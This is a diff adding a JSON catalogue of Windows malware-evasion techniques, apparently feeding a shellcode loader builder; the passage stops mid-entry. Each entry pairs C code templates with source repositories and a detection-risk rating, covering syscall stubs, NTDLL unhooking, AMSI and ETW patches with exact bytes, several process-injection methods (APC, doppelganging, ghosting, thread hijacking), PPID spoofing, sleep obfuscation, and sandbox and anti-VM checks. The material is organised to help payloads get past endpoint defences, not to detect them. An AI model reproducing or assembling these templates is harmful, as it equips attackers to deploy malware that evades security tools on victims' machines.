@@ -1,0 +1,1208 @@
+{
+  "version": "1.1",
+  "last_updated": "2026-03-06T12:00:00.000000",
+  "techniques": [
+    {
+      "id": "T001",
+      "name": "Direct Syscall",
+      "type": "execution_evasion",
+      "description": "通过直接系统调用绕过用户态Hook，避免EDR检测",
+      "complexity": "complex",
+      "source": "icyguider/Shhhloader, f1zm0/acheron",
+      "apis": [
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory",
+        "NtProtectVirtualMemory",
+        "NtCreateThreadEx"
+      ],
+      "code_template": "// Direct syscall stub\ntypedef NTSTATUS (NTAPI* pNtAllocateVirtualMemory)(\n    HANDLE ProcessHandle,\n    PVOID* BaseAddress,\n    ULONG_PTR ZeroBits,\n    PSIZE_T RegionSize,\n    ULONG AllocationType,\n    ULONG Protect\n);\n\n// Get syscall number from NTDLL\nDWORD GetSyscallNumber(LPCSTR funcName) {\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    PVOID funcAddr = GetProcAddress(hNtdll, funcName);\n    // Extract SSN from stub\n    return *(DWORD*)((BYTE*)funcAddr + 4);\n}\n\n// Execute syscall\n__asm__ volatile (\n    \"mov r10, rcx\\n\"\n    \"mov eax, %0\\n\"\n    \"syscall\\n\"\n    : : \"r\"(ssn) : \"rax\", \"r10\"\n);",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T002",
+      "name": "Indirect Syscall",
+      "type": "execution_evasion",
+      "description": "通过间接系统调用，跳转到NTDLL中的syscall指令地址，更隐蔽",
+      "complexity": "complex",
+      "source": "f1zm0/acheron",
+      "apis": [
+        "NtAllocateVirtualMemory",
+        "NtWriteVirtualMemory"
+      ],
+      "code_template": "// Find syscall instruction address in NTDLL\nPVOID GetSyscallAddress() {\n    HMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\n    // Find 'syscall' instruction pattern\n    BYTE pattern[] = {0x0F, 0x05, 0xC3}; // syscall; ret\n    // Search in .text section...\n    return syscallAddr;\n}\n\n// Jump to syscall via trampoline\n__asm__ volatile (\n    \"mov r10, rcx\\n\"\n    \"mov eax, %0\\n\"\n    \"jmp %1\\n\"\n    : : \"r\"(ssn), \"r\"(syscallAddr)\n);",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T003",
+      "name": "API Hashing",
+      "type": "api_obfuscation",
+      "description": "通过哈希值动态解析API地址，隐藏导入表",
+      "complexity": "medium",
+      "source": "icyguider/Shhhloader",
+      "apis": [],
+      "code_template": "// Calculate API hash\nDWORD HashAPI(LPCSTR str) {\n    DWORD hash = 0x35;\n    while (*str) {\n        hash += (*str++ + (hash << 1));\n    }\n    return hash;\n}\n\n// Resolve API by hash from PEB\nPVOID GetAPIByHash(DWORD hash) {\n    PPEB peb = (PPEB)__readgsqword(0x60);\n    PLDR_DATA_TABLE_ENTRY module = (PLDR_DATA_TABLE_ENTRY)peb->Ldr->InMemoryOrderModuleList.Flink;\n    // Walk PEB, parse exports, compare hashes...\n    return funcAddr;\n}",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T004",
+      "name": "String XOR Encryption",
+      "type": "string_obfuscation",
+      "description": "XOR加密字符串，避免静态分析检测",
+      "complexity": "simple",
+      "source": "icyguider/Shhhloader",
+      "apis": [],
+      "code_template": "// Compile-time XOR\n#define XOR_KEY 0x41\nchar encrypted[] = { 0x2a, 0x28, 0x3f, ... }; // XOR encrypted string\n\nvoid DecryptString(char* data, size_t len, char key) {\n    for (size_t i = 0; i < len; i++) {\n        data[i] ^= key;\n    }\n}\n\n// Or use skCrypter library\n#define skCrypt(str) str",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T005",
+      "name": "Permission Flipping",
+      "type": "memory_evasion",
+      "description": "先分配RW内存，写入后改为RX，避免RWX页面",
+      "complexity": "simple",
+      "source": "batuhan-arda/Direct-Syscall-APC-Injection",
+      "apis": [
+        "VirtualAlloc",
+        "VirtualProtect",
+        "NtProtectVirtualMemory"
+      ],
+      "code_template": "// Allocate RW first\nLPVOID addr = VirtualAlloc(NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nmemcpy(addr, shellcode, size);\n\n// Flip to RX before execution\nDWORD oldProtect;\nVirtualProtect(addr, size, PAGE_EXECUTE_READ, &oldProtect);\n\n// Execute\n((void(*)())addr)();",
+      "detection_risk": "low",
+      "compatibility": [
+        "VirtualAlloc",
+        "NtAllocateVirtualMemory",
+        "HeapAlloc"
+      ]
+    },
+    {
+      "id": "T006",
+      "name": "NTDLL Unhooking",
+      "type": "unhooking",
+      "description": "从磁盘重新加载干净的NTDLL，移除EDR Hook",
+      "complexity": "complex",
+      "source": "icyguider/Shhhloader",
+      "apis": [
+        "LoadLibrary",
+        "CreateFile",
+        "ReadFile",
+        "VirtualProtect"
+      ],
+      "code_template": "// Read clean NTDLL from disk\nHANDLE hFile = CreateFileA(\"C:\\\\Windows\\\\System32\\\\ntdll.dll\", ...);\nReadFile(hFile, buffer, ...);\n\n// Find .text section\n// Copy clean code to hooked NTDLL\nLPVOID ntdllBase = GetModuleHandleA(\"ntdll.dll\");\nVirtualProtect(ntdllBase + textSectionOffset, textSize, PAGE_EXECUTE_READWRITE, &old);\nmemcpy(ntdllBase + textSectionOffset, cleanCode, textSize);\nVirtualProtect(ntdllBase + textSectionOffset, textSize, old, &old);",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T007",
+      "name": "Shellcode Encryption (AES/RSA)",
+      "type": "string_obfuscation",
+      "description": "使用AES或RSA加密shellcode，运行时解密",
+      "complexity": "medium",
+      "source": "Hzllaga/ShellcodeLoader, SaadAhla/Shellcode-Hide",
+      "apis": [
+        "CryptAcquireContext",
+        "CryptDecrypt",
+        "CryptEncrypt"
+      ],
+      "code_template": "// AES decryption\n#include <wincrypt.h>\nHCRYPTPROV hProv;\nHCRYPTKEY hKey;\nCryptAcquireContext(&hProv, NULL, NULL, PROV_RSA_AES, 0);\nCryptImportKey(hProv, keyBlob, keyBlobSize, 0, 0, &hKey);\nCryptDecrypt(hKey, 0, TRUE, 0, encryptedShellcode, &shellcodeLen);",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T008",
+      "name": "Process Injection",
+      "type": "execution_evasion",
+      "description": "注入shellcode到其他进程执行",
+      "complexity": "complex",
+      "source": "batuhan-arda/Direct-Syscall-APC-Injection",
+      "apis": [
+        "CreateProcess",
+        "OpenProcess",
+        "VirtualAllocEx",
+        "WriteProcessMemory",
+        "CreateRemoteThread"
+      ],
+      "code_template": "// Create suspended process\nSTARTUPINFO si = { sizeof(si) };\nPROCESS_INFORMATION pi;\nCreateProcessA(NULL, \"C:\\\\Windows\\\\System32\\\\notepad.exe\", \n    NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n\n// Allocate in target\nLPVOID addr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT, PAGE_READWRITE);\nWriteProcessMemory(pi.hProcess, addr, shellcode, size, NULL);\nVirtualProtectEx(pi.hProcess, addr, size, PAGE_EXECUTE_READ, &old);\n\n// Execute via APC\nQueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);\nResumeThread(pi.hThread);",
+      "detection_risk": "medium",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T009",
+      "name": "Shellcode Encoding (Base64/UUID/IPv4)",
+      "type": "string_obfuscation",
+      "description": "使用Base64、UUID或IPv4格式编码shellcode",
+      "complexity": "simple",
+      "source": "SaadAhla/Shellcode-Hide",
+      "apis": [],
+      "code_template": "// UUID encoding\nconst char* uuids[] = {\n    \"fc4883e4f0-e8c0-0000-0000-415141415152\",\n    // More UUIDs...\n};\n\nvoid DecodeUUID(const char* uuid, BYTE* out) {\n    UUID u;\n    UuidFromStringA((RPC_CSTR)uuid, &u);\n    memcpy(out, &u, 16);\n}\n\n// IPv4 encoding\nconst char* ips[] = {\"252.72.131.228\", \"240.232.192.0\", ...};\nvoid DecodeIP(const char* ip, BYTE* out) {\n    inet_pton(AF_INET, ip, out);\n}",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T010",
+      "name": "Callback Execution",
+      "type": "execution_evasion",
+      "description": "通过Windows回调机制执行shellcode，避免显式线程创建",
+      "complexity": "medium",
+      "source": "Multiple sources",
+      "apis": [
+        "EnumWindows",
+        "EnumChildWindows",
+        "EnumDesktopsW",
+        "EnumResourceTypesW",
+        "SetWindowsHookEx"
+      ],
+      "code_template": "// Via EnumWindows\nLPVOID shellcodeAddr = ...; // shellcode address\nEnumWindows((WNDENUMPROC)shellcodeAddr, NULL);\n\n// Via EnumChildWindows\nEnumChildWindows(GetDesktopWindow(), (WNDENUMPROC)shellcodeAddr, NULL);\n\n// Via timer callback\nSetTimer(NULL, 0, 0, (TIMERPROC)shellcodeAddr);\nMsgWaitForMultipleObjects(0, NULL, FALSE, 100, QS_ALLINPUT);",
+      "detection_risk": "medium",
+      "compatibility": [
+        "all_allocators"
+      ]
+    },
+    {
+      "id": "T011",
+      "name": "Sandbox Detection",
+      "type": "anti_analysis",
+      "description": "检测沙箱环境，避免在分析环境中执行",
+      "complexity": "medium",
+      "source": "Multiple sources",
+      "apis": [
+        "GetSystemInfo",
+        "GlobalMemoryStatusEx",
+        "GetDiskFreeSpaceEx",
+        "CreateToolhelp32Snapshot"
+      ],
+      "code_template": "// Check CPU cores\nSYSTEM_INFO si;\nGetSystemInfo(&si);\nif (si.dwNumberOfProcessors < 2) return FALSE;\n\n// Check RAM\nMEMORYSTATUSEX ms = { sizeof(ms) };\nGlobalMemoryStatusEx(&ms);\nif (ms.ullTotalPhys < 4ULL * 1024 * 1024 * 1024) return FALSE;\n\n// Check disk size\nULARGE_INTEGER freeBytes;\nGetDiskFreeSpaceExA(\"C:\\\\\", NULL, &freeBytes, NULL);\nif (freeBytes.QuadPart < 60ULL * 1024 * 1024 * 1024) return FALSE;\n\n// Check for analysis tools\nHANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);\n// Check for wireshark, processhacker, etc.",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T012",
+      "name": "Anti-Debug",
+      "type": "anti_analysis",
+      "description": "检测调试器，防止动态分析",
+      "complexity": "simple",
+      "source": "Multiple sources",
+      "apis": [
+        "IsDebuggerPresent",
+        "CheckRemoteDebuggerPresent",
+        "NtQueryInformationProcess"
+      ],
+      "code_template": "// Simple check\nif (IsDebuggerPresent()) return FALSE;\n\n// Remote debugger check\nBOOL isDebugged = FALSE;\nCheckRemoteDebuggerPresent(GetCurrentProcess(), &isDebugged);\nif (isDebugged) return FALSE;\n\n// NtQueryInformationProcess\ntypedef NTSTATUS (NTAPI* pNtQueryInformationProcess)(\n    HANDLE, DWORD, PVOID, ULONG, PULONG);\nDWORD debugPort = 0;\npNtQueryInformationProcess NtQIP = (pNtQueryInformationProcess)\n    GetProcAddress(GetModuleHandleA(\"ntdll.dll\"), \"NtQueryInformationProcess\");\nNtQIP(GetCurrentProcess(), 7, &debugPort, sizeof(debugPort), NULL);\nif (debugPort != 0) return FALSE;",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T013",
+      "name": "AMSI Bypass",
+      "type": "amsi_etw_bypass",
+      "description": "绕过反恶意软件扫描接口(AMSI)",
+      "complexity": "medium",
+      "source": "Multiple sources",
+      "apis": [
+        "LoadLibrary",
+        "GetProcAddress",
+        "VirtualProtect"
+      ],
+      "code_template": "// Patch AMSI\nHMODULE hAmsi = LoadLibraryA(\"amsi.dll\");\nFARPROC amsiScanBuffer = GetProcAddress(hAmsi, \"AmsiScanBuffer\");\n\n// Patch to return AMSI_RESULT_CLEAN\nDWORD oldProtect;\nVirtualProtect(amsiScanBuffer, 6, PAGE_EXECUTE_READWRITE, &oldProtect);\nmemcpy(amsiScanBuffer, \"\\xB8\\x57\\x00\\x07\\x80\\xC3\", 6); // mov eax, 0x80070057; ret\nVirtualProtect(amsiScanBuffer, 6, oldProtect, &oldProtect);",
+      "detection_risk": "medium",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T014",
+      "name": "ETW Bypass",
+      "type": "amsi_etw_bypass",
+      "description": "禁用ETW事件跟踪，避免遥测",
+      "complexity": "simple",
+      "source": "Multiple sources",
+      "apis": [
+        "LoadLibrary",
+        "GetProcAddress",
+        "VirtualProtect"
+      ],
+      "code_template": "// Patch ETW\nHMODULE hNtdll = GetModuleHandleA(\"ntdll.dll\");\nFARPROC etwEventWrite = GetProcAddress(hNtdll, \"EtwEventWrite\");\n\nDWORD oldProtect;\nVirtualProtect(etwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect);\n*(BYTE*)etwEventWrite = 0xC3; // ret\nVirtualProtect(etwEventWrite, 1, oldProtect, &oldProtect);",
+      "detection_risk": "medium",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T015",
+      "name": "Heap Allocation",
+      "type": "memory_evasion",
+      "description": "使用堆内存而非虚拟内存，降低检测率",
+      "complexity": "medium",
+      "source": "Multiple sources",
+      "apis": [
+        "HeapCreate",
+        "HeapAlloc",
+        "VirtualProtect"
+      ],
+      "code_template": "// Create executable heap\nHANDLE hHeap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);\nLPVOID addr = HeapAlloc(hHeap, HEAP_ZERO_MEMORY, shellcodeSize);\nmemcpy(addr, shellcode, shellcodeSize);\n\n// Execute\n((void(*)())addr)();\n\n// Cleanup\nHeapDestroy(hHeap);",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T016",
+      "name": "Callstack Spoofing",
+      "type": "execution_evasion",
+      "description": "伪造调用栈，使敏感API调用看起来来自合法模块",
+      "complexity": "complex",
+      "source": "WithSecureLabs/CallStackSpoofer, pard0p/CallstackSpoofingPOC",
+      "apis": [
+        "RtlCaptureContext",
+        "NtContinue",
+        "VirtualProtect"
+      ],
+      "code_template": "// Spoof callstack before sensitive API call\n// Find gadget in legitimate module (e.g., ntdll.dll)\nPVOID gadgetAddr = FindGadgetInModule(\"ntdll.dll\", pattern);\n\n// Build fake stack frame with return addresses pointing to gadgets\nstruct FAKE_FRAME {\n    PVOID returnAddr;  // Points to gadget\n    PVOID rbp;\n    PVOID savedRegs[5];\n};\n\n// Call target function with spoofed stack\n__declspec(noinline) void CallWithSpoofedStack(PVOID target, PVOID* args) {\n    // Save real RBP, setup fake frame\n    // Execute target with spoofed return address\n}",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T017",
+      "name": "Early Bird APC Injection",
+      "type": "execution_evasion",
+      "description": "在进程初始化前通过APC注入shellcode",
+      "complexity": "medium",
+      "source": "Faran-17/EarlyBird-APC-Injection, reveng007/DarkWidow",
+      "apis": [
+        "CreateProcess",
+        "QueueUserAPC",
+        "ResumeThread",
+        "VirtualAllocEx"
+      ],
+      "code_template": "// Create suspended process\nSTARTUPINFO si = { sizeof(si) };\nPROCESS_INFORMATION pi;\nCreateProcessA(NULL, \"C:\\\\Windows\\\\System32\\\\werfault.exe\", \n    NULL, NULL, FALSE, CREATE_SUSPENDED, NULL, NULL, &si, &pi);\n\n// Allocate and write shellcode\nLPVOID addr = VirtualAllocEx(pi.hProcess, NULL, size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);\nWriteProcessMemory(pi.hProcess, addr, shellcode, size, NULL);\nVirtualProtectEx(pi.hProcess, addr, size, PAGE_EXECUTE_READ, &old);\n\n// Queue APC to main thread before it starts\nQueueUserAPC((PAPCFUNC)addr, pi.hThread, 0);\nResumeThread(pi.hThread);",
+      "detection_risk": "medium",
+      "compatibility": [
+        "process_injection"
+      ]
+    },
+    {
+      "id": "T018",
+      "name": "Process Doppelganging",
+      "type": "execution_evasion",
+      "description": "使用NTFS事务创建进程，避免文件系统检测",
+      "complexity": "complex",
+      "source": "hasherezade/process_doppelganging",
+      "apis": [
+        "NtCreateTransaction",
+        "NtCreateSection",
+        "NtRollbackTransaction",
+        "NtCreateProcessEx"
+      ],
+      "code_template": "// Create NTFS transaction\nHANDLE hTx;\nNtCreateTransaction(&hTx, TRANSACTION_ALL_ACCESS, NULL, NULL, NULL, 0, 0, 0, NULL, NULL);\n\n// Create file within transaction\nHANDLE hFile = CreateFileTransactedA(path, GENERIC_WRITE, 0, NULL, CREATE_NEW, \n    FILE_ATTRIBUTE_NORMAL, NULL, hTx, NULL, NULL);\nWriteFile(hFile, payload, payloadSize, &written, NULL);\n\n// Create section from transacted file\nHANDLE hSection;\nNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);\n\n// Rollback transaction (file disappears from filesystem)\nNtRollbackTransaction(hTx, TRUE);\n\n// Create process from section (file no longer exists but process still created!)\nNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), \n    PS_INHERIT_HANDLES, hSection, NULL, NULL, 0);",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "process_injection"
+      ]
+    },
+    {
+      "id": "T019",
+      "name": "Process Ghosting",
+      "type": "execution_evasion",
+      "description": "使用删除待定文件创建进程，更隐蔽的进程注入方式",
+      "complexity": "complex",
+      "source": "hasherezade/process_ghosting",
+      "apis": [
+        "NtCreateFile",
+        "NtSetInformationFile",
+        "NtCreateSection",
+        "NtCreateProcessEx"
+      ],
+      "code_template": "// Create file with DELETE_PENDING disposition\nHANDLE hFile;\nNtCreateFile(&hFile, GENERIC_WRITE | DELETE, &objAttr, &ioStatus, NULL, \n    FILE_ATTRIBUTE_NORMAL, 0, FILE_OVERWRITE_IF, 0, NULL, 0);\n\n// Set delete pending\nFILE_DISPOSITION_INFO dispInfo = { TRUE };\nNtSetInformationFile(hFile, &ioStatus, &dispInfo, sizeof(dispInfo), FileDispositionInformation);\n\n// Write payload\nWriteFile(hFile, payload, payloadSize, &written, NULL);\n\n// Create section from file\nHANDLE hSection;\nNtCreateSection(&hSection, SECTION_ALL_ACCESS, NULL, NULL, PAGE_EXECUTE_READWRITE, SEC_COMMIT, hFile);\n\n// Close file (file is now deleted)\nCloseHandle(hFile);\n\n// Create process from section\nNtCreateProcessEx(&hProcess, PROCESS_ALL_ACCESS, NULL, GetCurrentProcess(), \n    PS_INHERIT_HANDLES, hSection, NULL, NULL, 0);",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "process_injection"
+      ]
+    },
+    {
+      "id": "T020",
+      "name": "PPID Spoofing",
+      "type": "execution_evasion",
+      "description": "伪造父进程ID，使进程看起来由合法进程启动",
+      "complexity": "medium",
+      "source": "reveng007/DarkWidow, hlldz/APC-PPID",
+      "apis": [
+        "CreateProcess",
+        "InitializeProcThreadAttributeList",
+        "UpdateProcThreadAttribute"
+      ],
+      "code_template": "// Find parent process (e.g., explorer.exe)\nDWORD ppid = FindProcessId(\"explorer.exe\");\nHANDLE hParent = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, ppid);\n\n// Initialize process thread attribute list\nSIZE_T attrListSize = 0;\nInitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);\nPPROC_THREAD_ATTRIBUTE_LIST attrList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(attrListSize);\nInitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize);\n\n// Set parent process attribute\nUpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_PARENT_PROCESS, \n    &hParent, sizeof(HANDLE), NULL, NULL);\n\n// Create process with spoofed parent\nSTARTUPINFOEX si = { sizeof(si) };\nsi.lpAttributeList = attrList;\nCreateProcessA(NULL, cmd, NULL, NULL, FALSE, \n    EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, \n    NULL, NULL, &si.StartupInfo, &pi);",
+      "detection_risk": "low",
+      "compatibility": [
+        "process_injection"
+      ]
+    },
+    {
+      "id": "T021",
+      "name": "BlockDLLs Mitigation Policy",
+      "type": "execution_evasion",
+      "description": "阻止非微软DLL加载到进程，防止EDR注入",
+      "complexity": "simple",
+      "source": "reveng007/DarkWidow, boku7/spawn",
+      "apis": [
+        "CreateProcess",
+        "InitializeProcThreadAttributeList",
+        "UpdateProcThreadAttribute"
+      ],
+      "code_template": "// Create process with BlockDLL policy\nSIZE_T attrListSize = 0;\nInitializeProcThreadAttributeList(NULL, 1, 0, &attrListSize);\nPPROC_THREAD_ATTRIBUTE_LIST attrList = (PPROC_THREAD_ATTRIBUTE_LIST)malloc(attrListSize);\nInitializeProcThreadAttributeList(attrList, 1, 0, &attrListSize);\n\n// Set mitigation policy to block non-MS DLLs\nDWORD64 policy = PROCESS_CREATION_MITIGATION_POLICY_BLOCK_NON_MICROSOFT_BINARIES_ALWAYS_ON;\nUpdateProcThreadAttribute(attrList, 0, PROC_THREAD_ATTRIBUTE_MITIGATION_POLICY, \n    &policy, sizeof(policy), NULL, NULL);\n\nSTARTUPINFOEX si = { sizeof(si) };\nsi.lpAttributeList = attrList;\nCreateProcessA(NULL, cmd, NULL, NULL, FALSE, \n    EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED, \n    NULL, NULL, &si.StartupInfo, &pi);",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "process_injection"
+      ]
+    },
+    {
+      "id": "T022",
+      "name": "Thread Hijacking",
+      "type": "execution_evasion",
+      "description": "劫持现有线程执行shellcode，避免创建新线程",
+      "complexity": "complex",
+      "source": "Friends-Security/RedirectThread, nffdev/ThreadHijacking",
+      "apis": [
+        "OpenThread",
+        "SuspendThread",
+        "GetThreadContext",
+        "SetThreadContext",
+        "ResumeThread"
+      ],
+      "code_template": "// Find target thread\nHANDLE hThread = OpenThread(THREAD_ALL_ACCESS, FALSE, threadId);\nSuspendThread(hThread);\n\n// Get and modify thread context\nCONTEXT ctx = { .ContextFlags = CONTEXT_FULL };\nGetThreadContext(hThread, &ctx);\n\n// Redirect RIP to shellcode\nctx.Rip = (DWORD64)shellcodeAddr;\n\n// Set new context and resume\nSetThreadContext(hThread, &ctx);\nResumeThread(hThread);",
+      "detection_risk": "medium",
+      "compatibility": [
+        "process_injection"
+      ]
+    },
+    {
+      "id": "T023",
+      "name": "Sleep Obfuscation",
+      "type": "execution_evasion",
+      "description": "在睡眠时加密内存中的shellcode，避免内存扫描",
+      "complexity": "complex",
+      "source": "NtDallas/KrakenMask",
+      "apis": [
+        "Sleep",
+        "VirtualProtect",
+        "RtlCaptureContext"
+      ],
+      "code_template": "// Obfuscated sleep\nvoid ObfuscatedSleep(DWORD ms) {\n    // Encrypt shellcode before sleep\n    DWORD oldProtect;\n    VirtualProtect(shellcodeAddr, shellcodeSize, PAGE_READWRITE, &oldProtect);\n    for (size_t i = 0; i < shellcodeSize; i++) {\n        shellcodeAddr[i] ^= xorKey;\n    }\n    \n    // Sleep\n    Sleep(ms);\n    \n    // Decrypt after sleep\n    for (size_t i = 0; i < shellcodeSize; i++) {\n        shellcodeAddr[i] ^= xorKey;\n    }\n    VirtualProtect(shellcodeAddr, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect);\n}",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T024",
+      "name": "Hell's Gate / TartarusGate",
+      "type": "execution_evasion",
+      "description": "动态从NTDLL解析系统调用号，绕过Hook",
+      "complexity": "complex",
+      "source": "jakobfriedl/BenevolentLoader, reveng007/DarkWidow",
+      "apis": [],
+      "code_template": "// Hell's Gate: Extract SSN from hooked NTDLL\nDWORD GetSSN(PVOID funcAddr) {\n    // Check if function is hooked (JMP instruction)\n    if (*(BYTE*)funcAddr == 0xE8 || *(BYTE*)funcAddr == 0xE9) {\n        // Function is hooked, need to find clean syscall\n        // Traverse nearby syscalls and calculate offset\n        for (int i = 1; i < 20; i++) {\n            DWORD nearbySSN = GetSSNFromNeighbor(funcAddr, i);\n            if (nearbySSN != -1) {\n                return nearbySSN - i; // Calculate target SSN\n            }\n        }\n    }\n    // Extract SSN from syscall stub: mov eax, SSN\n    return *(DWORD*)((BYTE*)funcAddr + 4);\n}",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T025",
+      "name": "DLL Sideloading",
+      "type": "execution_evasion",
+      "description": "通过DLL劫持加载恶意DLL，利用合法程序执行",
+      "complexity": "medium",
+      "source": "Flangvik/SharpDllProxy, georgesotiriadis/Chimera",
+      "apis": [],
+      "code_template": "// DLL Proxy - forward exports to legitimate DLL\n//恶意DLL (version.dll) 加载时会转发到真实DLL\n\n#pragma comment(linker, \"/export:GetFileVersionInfoA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoA,@1\")\n#pragma comment(linker, \"/export:GetFileVersionInfoSizeA=C:\\\\Windows\\\\System32\\\\version.GetFileVersionInfoSizeA,@2\")\n\nBOOL APIENTRY DllMain(HMODULE hModule, DWORD reason, LPVOID reserved) {\n    switch (reason) {\n        case DLL_PROCESS_ATTACH:\n            // Execute shellcode\n            RunShellcode();\n            break;\n    }\n    return TRUE;\n}",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T026",
+      "name": "Anti-VM Detection",
+      "type": "anti_analysis",
+      "description": "检测虚拟机环境，避免在VM中执行",
+      "complexity": "medium",
+      "source": "nsmfoo/antivmdetection, uzokingkong/Anti-VM",
+      "apis": [
+        "GetSystemInfo",
+        "RegOpenKeyEx",
+        "RegQueryValueEx",
+        "CreateFile"
+      ],
+      "code_template": "// Check for VM artifacts\nBOOL IsVM() {\n    // Check CPUID\n    int cpuinfo[4];\n    __cpuid(cpuinfo, 1);\n    if ((cpuinfo[2] >> 31) & 1) return TRUE; // Hypervisor present\n    \n    // Check common VM files\n    if (GetFileAttributesA(\"C:\\\\Windows\\\\System32\\\\drivers\\\\VBoxGuest.sys\") != INVALID_FILE_ATTRIBUTES)\n        return TRUE;\n    if (GetFileAttributesA(\"C:\\\\Windows\\\\System32\\\\drivers\\\\vmhgfs.sys\") != INVALID_FILE_ATTRIBUTES)\n        return TRUE;\n    \n    // Check registry for VM indicators\n    HKEY hKey;\n    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE, \"SYSTEM\\\\CurrentControlSet\\\\Services\\\\Disk\\\\Enum\", \n                      0, KEY_READ, &hKey) == ERROR_SUCCESS) {\n        char buf[256];\n        DWORD size = sizeof(buf);\n        RegQueryValueExA(hKey, \"0\", NULL, NULL, (LPBYTE)buf, &size);\n        if (strstr(buf, \"VBOX\") || strstr(buf, \"VMware\") || strstr(buf, \"QEMU\"))\n            return TRUE;\n    }\n    return FALSE;\n}",
+      "detection_risk": "very_low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T027",
+      "name": "Shellcode Encryption (RC4/ChaCha20)",
+      "type": "string_obfuscation",
+      "description": "使用RC4或ChaCha20等流密码加密shellcode",
+      "complexity": "medium",
+      "source": "nickvourd/Supernova",
+      "apis": [],
+      "code_template": "// RC4 decryption\nvoid RC4Decrypt(BYTE* key, BYTE* data, size_t len) {\n    BYTE S[256];\n    for (int i = 0; i < 256; i++) S[i] = i;\n    \n    int j = 0;\n    for (int i = 0; i < 256; i++) {\n        j = (j + S[i] + key[i % keyLen]) % 256;\n        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;\n    }\n    \n    int i = 0, j = 0;\n    for (size_t k = 0; k < len; k++) {\n        i = (i + 1) % 256;\n        j = (j + S[i]) % 256;\n        BYTE tmp = S[i]; S[i] = S[j]; S[j] = tmp;\n        data[k] ^= S[(S[i] + S[j]) % 256];\n    }\n}",
+      "detection_risk": "low",
+      "compatibility": [
+        "all_loaders"
+      ]
+    },
+    {
+      "id": "T028",
+      "name": "Fiber Execution",
+      "type": "execution_evasion",
+      "description": "通过Fiber机制执行shellcode，不创建线程",
+      "complexity": "medium",
+      "source": "Kara-4search/Fiber_ShellcodeExecution",
+      "apis": [
+        "ConvertThreadToFiber",
+        "CreateFiber",
+        "SwitchToFiber",
+        "DeleteFiber"
+      ],
+      "code_template": "// Convert current thread to fiber\nConvertThreadToFiber(NULL);\n\n// Create fiber with shellcode as entry point\nLPVOID fiber = CreateFiber(0, (LPFIBER_START_ROUTINE)shellcodeAddr, NULL);\n\n// Switch to fiber (executes shellcode)\nSwitchToFiber(fiber);\n\n// Cleanup\nDeleteFiber(fiber);",
+      "detection_risk": "medium",
+      "compatibility": [
+        "all_allocators"
+      ]
+    },
+    {
+      "id": "T029",
+      "name": "PEB Walking",
+      "type": "api_obfuscation",
+      "description": "通过遍历PEB获取模块和API地址，避免使用GetModuleHandle和GetProcAddress",
+      "complexity": "medium",
+      "source": "icyguider/Shhhloader, reveng007/DarkWidow",
+      "apis": [],
